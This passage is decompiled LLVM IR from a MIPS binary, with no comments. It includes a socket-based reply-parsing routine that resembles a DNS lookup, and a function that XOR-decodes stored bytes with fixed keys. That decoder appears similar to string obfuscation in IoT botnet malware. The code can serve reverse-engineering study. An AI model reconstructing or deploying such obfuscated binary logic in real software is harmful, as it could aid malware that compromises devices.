  store i32 %v3_40215c, i32* @t9, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v1_402164 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v1_402164, i32* @a0, align 4
  %v2_402164 = call i32 @function_404c80()
  store i32 %v2_402164, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 4, i32* @a1, align 4
  %v3_402174 = load i32, i32* @global_var_449b24.80, align 4
  store i32 %v3_402174, i32* @t9, align 4
  %v0_402178 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_402178, i32* @a0, align 4
  %v2_40217c = or i32 %v2_402164, 128
  store i32 %v2_40217c, i32* %a2.global-to-local, align 4
  %v3_40217c = call i32 @function_404c80()
  %v2_402184 = ptrtoint i32* %stack_var_-4272 to i32
  store i32 %v2_402184, i32* %a1.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 %v2_402184, i32* %v0.global-to-local, align 4
  store i32 %v2_401f94, i32* %v1.global-to-local, align 4
  %v5_40219c = ptrtoint i32* %stack_var_-4296 to i32
  br label %dec_label_pc_402194

dec_label_pc_402194:                              ; preds = %dec_label_pc_402194, %dec_label_pc_40215c
  %v0_402194 = phi i32 [ %v1_402198, %dec_label_pc_402194 ], [ %v2_402184, %dec_label_pc_40215c ]
  %v1_402194 = inttoptr i32 %v0_402194 to i32*
  store i32 0, i32* %v1_402194, align 4
  %v0_402198 = load i32, i32* %v0.global-to-local, align 4
  %v1_402198 = add i32 %v0_402198, 4
  store i32 %v1_402198, i32* %v0.global-to-local, align 4
  %v1_40219c = load i32, i32* %v1.global-to-local, align 4
  %v2_40219c = icmp eq i32 %v1_402198, %v1_40219c
  store i32 %v5_40219c, i32* %a0.global-to-local, align 4
  br i1 %v2_40219c, label %dec_label_pc_4021a0, label %dec_label_pc_402194

dec_label_pc_4021a0:                              ; preds = %dec_label_pc_402194
  %v0_4021a4 = load i32, i32* %s4.global-to-local, align 4
  %v1_4021a4 = udiv i32 %v0_4021a4, 32
  %v1_4021a8 = mul nuw nsw i32 %v1_4021a4, 4
  store i32 %v1_4021a8, i32* %v0.global-to-local, align 4
  %v2_4021ac = add i32 %v1_4021a8, %v5_40219c
  store i32 %v2_4021ac, i32* @s0, align 4
  %v1_4021b0 = add i32 %v2_4021ac, 24
  %v2_4021b0 = inttoptr i32 %v1_4021b0 to i32*
  %v3_4021b0 = load i32, i32* %v2_4021b0, align 4
  %v1_4021b4 = urem i32 %v0_4021a4, 32
  store i32 %v1_4021b4, i32* %s1.global-to-local, align 4
  %v2_4021bc = shl i32 1, %v1_4021b4
  %v2_4021c0 = or i32 %v3_4021b0, %v2_4021bc
  store i32 %v2_4021c0, i32* %v1.global-to-local, align 4
  %v3_4021c4 = load i32, i32* @global_var_449ca0.122, align 4
  store i32 %v3_4021c4, i32* @t9, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  store i32 %v2_4021c0, i32* %v2_4021b0, align 4
  %v0_4021d0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4021d0, i32* %stack_var_-4296, align 4
  %v0_4021dc = load i32, i32* %s4.global-to-local, align 4
  %v1_4021dc = add i32 %v0_4021dc, 1
  store i32 %v1_4021dc, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  %v4_4021e4 = call i32 @function_4051d0(i32 %v1_4021dc, i32 0, i32 0)
  store i32 %v4_4021e4, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v2_4021f8 = icmp eq i32 %v4_4021e4, -1
  br i1 %v2_4021f8, label %dec_label_pc_402450, label %dec_label_pc_4021fc

dec_label_pc_4021fc:                              ; preds = %dec_label_pc_4021a0
  %v1_402200 = icmp eq i32 %v4_4021e4, 0
  %v2_402200 = load i32, i32* %s7.global-to-local, align 4
  %v3_402200 = add i32 %v2_402200, 1
  store i32 %v3_402200, i32* %v0.global-to-local, align 4
  br i1 %v1_402200, label %dec_label_pc_402438, label %dec_label_pc_402204

dec_label_pc_402204:                              ; preds = %dec_label_pc_4021fc
  %v0_402208 = load i32, i32* @s0, align 4
  %v1_402208 = add i32 %v0_402208, 24
  %v2_402208 = inttoptr i32 %v1_402208 to i32*
  %v3_402208 = load i32, i32* %v2_402208, align 4
  %v1_402210 = load i32, i32* %s1.global-to-local, align 4
  %tmp66 = shl i32 1, %v1_402210
  %v1_40221426 = and i32 %tmp66, %v3_402208
  %v1_402218 = icmp eq i32 %v1_40221426, 0
  store i32 %v3_402200, i32* %v0.global-to-local, align 4
  br i1 %v1_402218, label %dec_label_pc_402438, label %dec_label_pc_40221c

dec_label_pc_40221c:                              ; preds = %dec_label_pc_402204
  %v2_402224 = ptrtoint i16* %stack_var_-2096 to i32
  store i32 %v2_402224, i32* %s1.global-to-local, align 4
  store i32 %v2_402224, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 2048, i32* @a2, align 4
  %v4_402230 = call i32 @function_404030(i32 %v2_402224, i32 0, i32 2048)
  store i32 %v4_402230, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 %v2_402224, i32* %a1.global-to-local, align 4
  %v3_402240 = load i32, i32* @global_var_449cac.123, align 4
  store i32 %v3_402240, i32* @t9, align 4
  store i32 2048, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v0_40224c = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_40224c, i32* %a0.global-to-local, align 4
  %v10_402254 = bitcast i16* %stack_var_-2096 to i32*
  %v11_402254 = call i32 @function_405eb0(i32 %v0_40224c, i32* %v10_402254, i32 2048, i32 16384, i32 0, i32 0)
  store i32 %v11_402254, i32* @v0, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 %v3_401f84, i32* %a0.global-to-local, align 4
  store i32 %v11_402254, i32* %s0.global-to-local, align 4
  %v2_40226c = call i32 @function_403f48()
  %v1_402274 = add i32 %v2_40226c, 17
  %v2_402278 = icmp ult i32 %v11_402254, %v1_402274
  %v3_402278 = zext i1 %v2_402278 to i32
  store i32 %v3_402278, i32* %s0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v2_402280 = load i32, i32* %s7.global-to-local, align 4
  %v3_402280 = add i32 %v2_402280, 1
  store i32 %v3_402280, i32* @v0, align 4
  br i1 %v2_402278, label %dec_label_pc_402438, label %dec_label_pc_402284

dec_label_pc_402284:                              ; preds = %dec_label_pc_40221c
  %v2_40228c = ptrtoint i32* %stack_var_-2084 to i32
  store i32 %v2_40228c, i32* %s5.global-to-local, align 4
  store i32 %v2_40228c, i32* %a0.global-to-local, align 4
  %v3_402290 = call i32 @function_403f48()
  %v3_402298 = ptrtoint i32* %stack_var_-2082 to i32
  store i32 %v3_402298, i32* %a0.global-to-local, align 4
  %v3_40229c = load i16, i16* %stack_var_-2096, align 2
  %v4_40229c = sext i16 %v3_40229c to i32
  store i32 %v4_40229c, i32* %v1.global-to-local, align 4
  store i32 %v3_402038, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v2_4022a8 = icmp eq i16 %v3_40229c, %v6_402040
  %v5_4022a8 = ptrtoint i32* %stack_var_-2077 to i32
  store i32 %v5_4022a8, i32* %s2.global-to-local, align 4
  br i1 %v2_4022a8, label %dec_label_pc_4022ac, label %dec_label_pc_402434

dec_label_pc_4022ac:                              ; preds = %dec_label_pc_402284
  %v1_4022b8 = icmp eq i16 %tmp32, 0
  %v2_4022b8 = load i32, i32* %s7.global-to-local, align 4
  %v3_4022b8 = add i32 %v2_4022b8, 1
  store i32 %v3_4022b8, i32* %v0.global-to-local, align 4
  br i1 %v1_4022b8, label %dec_label_pc_402438, label %dec_label_pc_4022bc

dec_label_pc_4022bc:                              ; preds = %dec_label_pc_4022ac
  %v4_4022c0 = zext i16 %tmp31 to i32
  %v1_4022c8 = mul nuw nsw i32 %v4_4022c0, 256
  %v1_4022cc = and i32 %v1_4022c8, 65280
  %div = udiv i16 %tmp31, 256
  %v1_4022d0 = zext i16 %div to i32
  %v2_4022d4 = or i32 %v1_4022cc, %v1_4022d0
  store i32 16, i32* %v1.global-to-local, align 4
  %v2_4022dc = icmp eq i32 %v2_4022d4, 16
  store i32 %v3_4022b8, i32* @v0, align 4
  br i1 %v2_4022dc, label %dec_label_pc_4022e0, label %dec_label_pc_402438

dec_label_pc_4022e0:                              ; preds = %dec_label_pc_4022bc
  store i32 %v5_4022a8, i32* %a0.global-to-local, align 4
  %v3_4022ec = call i32 @function_403f48()
  store i32 %v3_4022ec, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 %v3_4022ec, i32* @a3, align 4
  store i32 %v5_4022a8, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 192, i32* %t0.global-to-local, align 4
  %v0_40230c.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_40230c

dec_label_pc_40230c:                              ; preds = %dec_label_pc_402330.dec_label_pc_40230c_crit_edge, %dec_label_pc_4022e0
  %v0_40231c = phi i32 [ %v2_40233c, %dec_label_pc_402330.dec_label_pc_40230c_crit_edge ], [ %v5_4022a8, %dec_label_pc_4022e0 ]
  %v1_402314 = phi i32 [ %v1_402314.pre, %dec_label_pc_402330.dec_label_pc_40230c_crit_edge ], [ 192, %dec_label_pc_4022e0 ]
  %v2_402330 = phi i32 [ %v4_40233c, %dec_label_pc_402330.dec_label_pc_40230c_crit_edge ], [ %v0_40230c.pre, %dec_label_pc_4022e0 ]
  %v1_40230c = inttoptr i32 %v2_402330 to i8*
  %v2_40230c = load i8, i8* %v1_40230c, align 1
  %v3_40230c = zext i8 %v2_40230c to i32
  store i32 %v3_40230c, i32* %v0.global-to-local, align 4
  %v2_402314 = icmp eq i32 %v3_40230c, %v1_402314
  %v4_402314 = add nuw nsw i32 %v3_40230c, 1
  store i32 %v4_402314, i32* %v1.global-to-local, align 4
  br i1 %v2_402314, label %dec_label_pc_402318, label %dec_label_pc_402330

dec_label_pc_402318:                              ; preds = %dec_label_pc_40230c
  %v1_40231c = add i32 %v0_40231c, 1
  %v2_40231c = inttoptr i32 %v1_40231c to i8*
  %v3_40231c = load i8, i8* %v2_40231c, align 1
  %v4_40231c = zext i8 %v3_40231c to i32
  %v0_402324 = load i32, i32* %s1.global-to-local, align 4
  %v2_402324 = add i32 %v0_402324, %v4_40231c
  store i32 %v2_402324, i32* %v0.global-to-local, align 4
  %v1_40232c = add i32 %v2_402324, -1
  store i32 %v1_40232c, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_402330

dec_label_pc_402330:                              ; preds = %dec_label_pc_40230c, %dec_label_pc_402318
  %v1_402330 = trunc i32 %v4_402314 to i8
  store i8 %v1_402330, i8* %v1_40230c, align 1
  %v0_402334 = load i32, i32* %a2.global-to-local, align 4
  %v1_402334 = add i32 %v0_402334, 1
  store i32 %v1_402334, i32* %a2.global-to-local, align 4
  %v1_402338 = load i32, i32* @a3, align 4
  %v2_402338 = icmp slt i32 %v1_402334, %v1_402338
  %v3_402338 = zext i1 %v2_402338 to i32
  store i32 %v3_402338, i32* %v0.global-to-local, align 4
  %v2_40233c = load i32, i32* %a0.global-to-local, align 4
  %v4_40233c = add i32 %v2_40233c, %v1_402334
  store i32 %v4_40233c, i32* %a1.global-to-local, align 4
  br i1 %v2_402338, label %dec_label_pc_402330.dec_label_pc_40230c_crit_edge, label %dec_label_pc_402340

dec_label_pc_402330.dec_label_pc_40230c_crit_edge: ; preds = %dec_label_pc_402330
  %v1_402314.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_40230c

dec_label_pc_402340:                              ; preds = %dec_label_pc_402330
  %v4_402348 = zext i8 %tmp30 to i32
  %v4_40234c = zext i8 %tmp29 to i32
  %v3_40235c = load i32, i32* @global_var_449cf8.124, align 4
  store i32 %v3_40235c, i32* @t9, align 4
  %v2_402360 = ptrtoint i32* %stack_var_-2065 to i32
  store i32 %v2_402360, i32* %s1.global-to-local, align 4
  %v1_402364 = mul nuw nsw i32 %v4_40234c, 256
  store i32 %v1_402364, i32* %v0.global-to-local, align 4
  %v2_40236c = or i32 %v4_402348, %v1_402364
  store i32 %v2_40236c, i32* %a2.global-to-local, align 4
  %v2_402370 = ptrtoint i32* %stack_var_-2064 to i32
  store i32 %v2_402370, i32* %a1.global-to-local, align 4
  store i32 %v2_402360, i32* %a0.global-to-local, align 4
  %v6_402374 = call i32 @function_4058c0(i32 %v2_402360, i32 %v2_402370, i32 %v2_40236c)
  store i32 %v6_402374, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v0_402380 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_402380, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 2048, i32* @a2, align 4
  %v4_40238c = call i32 @function_404030(i32 %v0_402380, i32 0, i32 2048)
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 %v1_402364, i32* @v0, align 4
  %v1_4023bc = add nsw i32 %v2_40236c, -1
  store i32 %v1_4023bc, i32* %a2.global-to-local, align 4
  %v0_4023c0 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_4023c0, i32* %a0.global-to-local, align 4
  store i32 %v2_402360, i32* %a1.global-to-local, align 4
  %v6_4023c4 = call i32 @function_403fa0(i32 %v0_4023c0, i32 %v2_402360, i32 %v1_4023bc)
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v0_4023d0 = load i32, i32* %s7.global-to-local, align 4
  %v1_4023d0 = trunc i32 %v0_4023d0 to i8
  %v2_4023d0 = load i32, i32* %s3.global-to-local, align 4
  %v3_4023d0 = add i32 %v2_4023d0, 2052
  %v4_4023d0 = inttoptr i32 %v3_4023d0 to i8*
  store i8 %v1_4023d0, i8* %v4_4023d0, align 1
  %v4_4023d4 = zext i8 %tmp28 to i32
  %v3_4023d8 = load i8, i8* %stack_var_-2075, align 1
  %v4_4023d8 = sext i8 %v3_4023d8 to i32
  %v1_4023dc = mul nuw nsw i32 %v4_4023d4, 256
  %v2_4023e0 = or i32 %v4_4023d8, %v1_4023dc
  %v1_4023e4 = mul nsw i32 %v4_4023d8, 256
  %v1_4023ec = udiv i32 %v2_4023e0, 256
  %v2_4023f0 = or i32 %v1_4023ec, %v1_4023e4
  %v1_4023f4 = trunc i32 %v2_4023f0 to i16
  %v2_4023f4 = load i32, i32* %s3.global-to-local, align 4
  %v3_4023f4 = add i32 %v2_4023f4, 2048
  %v4_4023f4 = inttoptr i32 %v3_4023f4 to i16*
  store i16 %v1_4023f4, i16* %v4_4023f4, align 2
  %v4_4023f8 = zext i8 %tmp27 to i32
  %v4_4023fc = zext i8 %tmp to i32
  %v1_40240c = mul nuw nsw i32 %v4_4023fc, 256
  store i32 %v1_40240c, i32* %v1.global-to-local, align 4
  %v2_402414 = or i32 %v1_40240c, %v4_4023f8
  store i32 %v2_402414, i32* @v0, align 4
  %v1_40241c = trunc i32 %v2_402414 to i16
  %v2_40241c = load i32, i32* %s3.global-to-local, align 4
  %v3_40241c = add i32 %v2_40241c, 2050
  %v4_40241c = inttoptr i32 %v3_40241c to i16*
  store i16 %v1_40241c, i16* %v4_40241c, align 2
  store i32 %v2_402360, i32* %a0.global-to-local, align 4
  %v3_402420 = call i32 @function_403f48()
  %v4_402420 = trunc i32 %v3_402420 to i8
  store i32 %v3_402420, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v3_402430 = load i32, i32* %s3.global-to-local, align 4
  %v4_402430 = add i32 %v3_402430, 2053
  %v5_402430 = inttoptr i32 %v4_402430 to i8*
  store i8 %v4_402420, i8* %v5_402430, align 1
  %v0_402474.pre.pre.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_402434

dec_label_pc_402434:                              ; preds = %dec_label_pc_402284, %dec_label_pc_402340
  %v0_402474.pre.pre = phi i32 [ %v2_401f30, %dec_label_pc_402284 ], [ %v0_402474.pre.pre.pre, %dec_label_pc_402340 ]
  %v0_402434 = load i32, i32* %s7.global-to-local, align 4
  %v1_402434 = add i32 %v0_402434, 1
  store i32 %v1_402434, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402438

dec_label_pc_402438:                              ; preds = %dec_label_pc_4022bc, %dec_label_pc_4022ac, %dec_label_pc_40221c, %dec_label_pc_402204, %dec_label_pc_4021fc, %dec_label_pc_402434
  %v0_402474.pre = phi i32 [ %v2_401f30, %dec_label_pc_4022bc ], [ %v2_401f30, %dec_label_pc_4022ac ], [ %v2_401f30, %dec_label_pc_40221c ], [ %v2_401f30, %dec_label_pc_402204 ], [ %v2_401f30, %dec_label_pc_4021fc ], [ %v0_402474.pre.pre, %dec_label_pc_402434 ]
  %v0_402438 = phi i32 [ %v3_4022b8, %dec_label_pc_4022bc ], [ %v3_4022b8, %dec_label_pc_4022ac ], [ %v3_402280, %dec_label_pc_40221c ], [ %v3_402200, %dec_label_pc_402204 ], [ %v3_402200, %dec_label_pc_4021fc ], [ %v1_402434, %dec_label_pc_402434 ]
  %v1_402438 = urem i32 %v0_402438, 65536
  store i32 %v1_402438, i32* %s7.global-to-local, align 4
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_402440 = icmp eq i32 %v1_402438, 11
  br i1 %v2_402440, label %dec_label_pc_402474, label %dec_label_pc_402450

dec_label_pc_402450:                              ; preds = %dec_label_pc_402438, %dec_label_pc_4021a0
  %v0_402450 = phi i32 [ %v2_401f30, %dec_label_pc_4021a0 ], [ %v0_402474.pre, %dec_label_pc_402438 ]
  %v1_402450 = add i32 %v0_402450, -32248
  %v2_402450 = inttoptr i32 %v1_402450 to i32*
  %v3_402450 = load i32, i32* %v2_402450, align 4
  store i32 25, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402450)
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v0_402470 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_402470, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_402474

dec_label_pc_402474:                              ; preds = %dec_label_pc_402438, %dec_label_pc_402450
  %v0_402474 = phi i32 [ %v2_401f30, %dec_label_pc_402450 ], [ %v0_402474.pre, %dec_label_pc_402438 ]
  %v1_402474 = add i32 %v0_402474, -32248
  %v2_402474 = inttoptr i32 %v1_402474 to i32*
  %v3_402474 = load i32, i32* %v2_402474, align 4
  store i32 25, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402474)
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  %v0_402488 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_402488, i32* %a0.global-to-local, align 4
  %v3_40248c = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_40248c, i32* @t9, align 4
  store i32 0, i32* %s3.global-to-local, align 4
  %v2_402494 = call i32 @function_404de0(i32 %v0_402488)
  store i32 0, i32* %v0.global-to-local, align 4
  store i32 %v2_401f30, i32* %gp.global-to-local, align 4
  store i32 %v0_401f38, i32* @ra, align 4
  store i32 %v0_401f3c, i32* @fp, align 4
  store i32 %v0_401f58, i32* @s1, align 4
  store i32 %v0_401f5c, i32* @s0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_402438, { 1, 0 }
  uselistorder i32 %v3_402420, { 1, 0 }
  uselistorder i32 %v1_40240c, { 1, 0 }
  uselistorder i32 %v1_402364, { 1, 2, 0 }
  uselistorder i32 %v2_402360, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v4_40233c, { 1, 0 }
  uselistorder i32 %v2_402224, { 0, 2, 1, 3 }
  uselistorder i32 %v1_4021b4, { 1, 0 }
  uselistorder i32 %v1_4021a8, { 1, 0 }
  uselistorder i32 %v0_4021a4, { 1, 0 }
  uselistorder i32 %v1_402198, { 1, 2, 0 }
  uselistorder i32 %v4_4020ec, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_4020c0, { 1, 0, 2 }
  uselistorder i32 %v3_402038, { 1, 2, 0 }
  uselistorder i32 %v4_401ff8, { 1, 0 }
  uselistorder i32 %v1_401ff0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_401fe4, { 1, 0 }
  uselistorder i32 %v1_401fd8, { 0, 2, 1 }
  uselistorder i32 %v2_401f94, { 1, 0 }
  uselistorder i32 %v3_401f84, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v2_401f30, { 21, 20, 7, 19, 6, 1, 2, 3, 4, 5, 0, 30, 29, 28, 27, 26, 25, 24, 23, 22, 18, 17, 16, 15, 32, 31, 14, 33, 13, 12, 11, 10, 9, 8, 34 }
  uselistorder i16* %stack_var_-4144, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4288, { 0, 2, 1 }
  uselistorder i16* %stack_var_-2096, { 2, 0, 1 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 11, 9, 10, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %a0.global-to-local, { 1, 3, 2, 4, 5, 6, 8, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 25, { 1, 2, 0 }
  uselistorder i32 2048, { 4, 2, 5, 1, 6, 3, 7, 0 }
  uselistorder label %dec_label_pc_402474, { 1, 0 }
  uselistorder label %dec_label_pc_402438, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_402434, { 1, 0 }
  uselistorder label %dec_label_pc_402330, { 1, 0 }
  uselistorder label %dec_label_pc_40215c, { 1, 0 }
  uselistorder label %dec_label_pc_4020e0, { 1, 0 }
}

define i32 @function_4024d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4024d4:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a2.global-to-local, align 4
  %v1_4024dc = load i32, i32* @t9, align 4
  %v2_4024dc = add i32 %v1_4024dc, 325004
  store i32 %v2_4024dc, i32* %gp.global-to-local, align 4
  %v3_4024e0 = load i32, i32* bitcast (i32** @global_var_449bdc.126 to i32*), align 4
  %v3_4024e4 = load i32, i32* @global_var_449c50.75, align 4
  store i32 %v3_4024e4, i32* @t9, align 4
  store i32 %v3_4024e0, i32* %a0.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  %v3_4024ec = call i32 @function_405010(i32 %v3_4024e0, i32 9)
  %v4_4024ec = inttoptr i32 %v3_4024ec to i16*
  %v1_4024fc = load i32, i32* @t9, align 4
  %v2_4024fc = add i32 %v1_4024fc, 324972
  store i32 %v2_4024fc, i32* %gp.global-to-local, align 4
  %v1_40251c = add i32 %v1_4024fc, 292804
  %v2_40251c = inttoptr i32 %v1_40251c to i32*
  %v3_40251c = load i32, i32* %v2_40251c, align 4
  %v1_402520 = urem i32 %v3_4024e0, 65536
  store i32 %v1_402520, i32* %s3.global-to-local, align 4
  store i32 12, i32* %a0.global-to-local, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40251c)
  store i32 %v2_4024fc, i32* %gp.global-to-local, align 4
  store i32 %v1_402520, i32* %a0.global-to-local, align 4
  %v3_40253c = load i32, i32* %v2_40251c, align 4
  %v4_402540 = add i32 %v3_4024ec, 2
  %v5_402540 = inttoptr i32 %v4_402540 to i8*
  store i8 9, i8* %v5_402540, align 1
  %v0_402544 = load i32, i32* %s3.global-to-local, align 4
  %v1_402544 = trunc i32 %v0_402544 to i16
  store i16 %v1_402544, i16* %v4_4024ec, align 2
  store i32 %v3_4024ec, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40253c)
  store i32 %v2_4024fc, i32* %gp.global-to-local, align 4
  store i32 %v3_4024ec, i32* %a0.global-to-local, align 4
  %v1_402558 = add i32 %v1_4024fc, 292600
  %v2_402558 = inttoptr i32 %v1_402558 to i32*
  %v3_402558 = load i32, i32* %v2_402558, align 4
  %v0_40255c = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_40255c, i32* %a1.global-to-local, align 4
  %v0_402560 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_402560, i32* %a2.global-to-local, align 4
  %v3_402564 = load i32, i32* %s2.global-to-local, align 4
  %v4_402564 = add i32 %v3_402564, 4
  %v5_402564 = inttoptr i32 %v4_402564 to i32*
  store i32 %v3_4024ec, i32* %v5_402564, align 4
  call void @__pseudo_call(i32 %v3_402558)
  store i32 %v2_4024fc, i32* %gp.global-to-local, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  store i32 -19, i32* %a3.global-to-local, align 4
  store i32 -22, i32* %a2.global-to-local, align 4
  store i32 -34, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_402584

dec_label_pc_402584:                              ; preds = %dec_label_pc_402584.dec_label_pc_402584_crit_edge, %dec_label_pc_4024d4
  %v1_402598 = phi i32 [ %v1_402598.pre, %dec_label_pc_402584.dec_label_pc_402584_crit_edge ], [ -19, %dec_label_pc_4024d4 ]
  %v0_40258c = phi i32 [ %v0_4025f4, %dec_label_pc_402584.dec_label_pc_402584_crit_edge ], [ 0, %dec_label_pc_4024d4 ]
  %v0_402584 = load i32, i32* %s2.global-to-local, align 4
  %v1_402584 = add i32 %v0_402584, 4
  %v2_402584 = inttoptr i32 %v1_402584 to i32*
  %v3_402584 = load i32, i32* %v2_402584, align 4
  %v2_40258c = add i32 %v3_402584, %v0_40258c
  %v1_402590 = inttoptr i32 %v2_40258c to i8*
  %v2_402590 = load i8, i8* %v1_402590, align 1
  %v3_402590 = zext i8 %v2_402590 to i32
  %v2_402598 = xor i32 %v3_402590, %v1_402598
  %v1_40259c = trunc i32 %v2_402598 to i8
  store i8 %v1_40259c, i8* %v1_402590, align 1
  %v0_4025a0 = load i32, i32* %s2.global-to-local, align 4
  %v1_4025a0 = add i32 %v0_4025a0, 4
  %v2_4025a0 = inttoptr i32 %v1_4025a0 to i32*
  %v3_4025a0 = load i32, i32* %v2_4025a0, align 4
  %v0_4025a8 = load i32, i32* %a0.global-to-local, align 4
  %v2_4025a8 = add i32 %v0_4025a8, %v3_4025a0
  %v1_4025ac = inttoptr i32 %v2_4025a8 to i8*
  %v2_4025ac = load i8, i8* %v1_4025ac, align 1
  %v3_4025ac = zext i8 %v2_4025ac to i32
  %v1_4025b4 = load i32, i32* %a2.global-to-local, align 4
  %v2_4025b4 = xor i32 %v1_4025b4, %v3_4025ac
  %v1_4025b8 = trunc i32 %v2_4025b4 to i8
  store i8 %v1_4025b8, i8* %v1_4025ac, align 1
  %v0_4025bc = load i32, i32* %s2.global-to-local, align 4
  %v1_4025bc = add i32 %v0_4025bc, 4
  %v2_4025bc = inttoptr i32 %v1_4025bc to i32*
  %v3_4025bc = load i32, i32* %v2_4025bc, align 4
  %v0_4025c4 = load i32, i32* %a0.global-to-local, align 4
  %v2_4025c4 = add i32 %v0_4025c4, %v3_4025bc
  %v1_4025c8 = inttoptr i32 %v2_4025c4 to i8*
  %v2_4025c8 = load i8, i8* %v1_4025c8, align 1
  %v3_4025c8 = zext i8 %v2_4025c8 to i32
  %v1_4025d0 = load i32, i32* %a1.global-to-local, align 4
  %v2_4025d0 = xor i32 %v1_4025d0, %v3_4025c8
  %v1_4025d4 = trunc i32 %v2_4025d0 to i8
  store i8 %v1_4025d4, i8* %v1_4025c8, align 1
  %v0_4025d8 = load i32, i32* %s2.global-to-local, align 4
  %v1_4025d8 = add i32 %v0_4025d8, 4
  %v2_4025d8 = inttoptr i32 %v1_4025d8 to i32*
  %v3_4025d8 = load i32, i32* %v2_4025d8, align 4
  %v0_4025e0 = load i32, i32* %a0.global-to-local, align 4
  %v2_4025e0 = add i32 %v0_4025e0, %v3_4025d8
  %v1_4025e4 = inttoptr i32 %v2_4025e0 to i8*
  %v2_4025e4 = load i8, i8* %v1_4025e4, align 1
  %v3_4025e4 = zext i8 %v2_4025e4 to i32
  %v1_4025e8 = add i32 %v0_4025e0, 1
  store i32 %v1_4025e8, i32* %a0.global-to-local, align 4
  %v1_4025ec = load i32, i32* %a1.global-to-local, align 4
  %v2_4025ec = xor i32 %v1_4025ec, %v3_4025e4
  %v1_4025f0 = trunc i32 %v2_4025ec to i8
  store i8 %v1_4025f0, i8* %v1_4025e4, align 1
  %v0_4025f4 = load i32, i32* %a0.global-to-local, align 4
  %v1_4025f4 = load i32, i32* %s3.global-to-local, align 4
  %v2_4025f4 = icmp slt i32 %v0_4025f4, %v1_4025f4
  br i1 %v2_4025f4, label %dec_label_pc_402584.dec_label_pc_402584_crit_edge, label %dec_label_pc_4025fc

dec_label_pc_402584.dec_label_pc_402584_crit_edge: ; preds = %dec_label_pc_402584
  %v1_402598.pre = load i32, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_402584

dec_label_pc_4025fc:                              ; preds = %dec_label_pc_402584
  %v0_402600 = load i32, i32* %gp.global-to-local, align 4
  %v1_402600 = add i32 %v0_402600, -32548
  %v2_402600 = inttoptr i32 %v1_402600 to i32*
